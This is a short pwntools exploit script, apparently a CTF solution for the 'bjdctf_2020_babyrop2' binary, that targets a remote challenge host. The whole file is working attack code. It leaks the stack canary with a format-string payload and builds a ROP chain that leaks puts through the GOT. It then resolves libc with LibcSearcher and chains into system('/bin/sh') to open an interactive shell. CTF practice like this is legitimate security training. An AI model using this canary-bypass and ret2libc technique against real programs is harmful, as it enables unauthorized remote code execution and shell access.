from pwn import *
from LibcSearcher import *
context.log_level = 'debug'

#p = process('./bjdctf_2020_babyrop2')
p = remote('node5.buuoj.cn',26196)
elf = ELF('./bjdctf_2020_babyrop2')

payload = b'%7$p'
#pause()
p.sendline(payload) 
#pause()
p.recvline()
p.recvline()
p.recvline()
cancary = p.recvline()
print(cancary.decode())

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
pop_rdi_ret = 0x0000000000400993
vuln_addr = elf.symbols['vuln']
cancary = int(cancary,16)

payload = b'b' * 24 
payload += p64(cancary) + p64(0) 
payload += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)
p.sendline(payload)
p.recvuntil(b'story!\n')
puts_addr = u64(p.recv(6)[-6:].ljust(8,b'\x00'))
print(hex(puts_addr))


libc = LibcSearcher('puts',puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
payload = b'b' * 24
payload += p64(cancary) + p64(0)
payload += p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)
pause()
p.sendline(payload)
pause()
p.interactive()


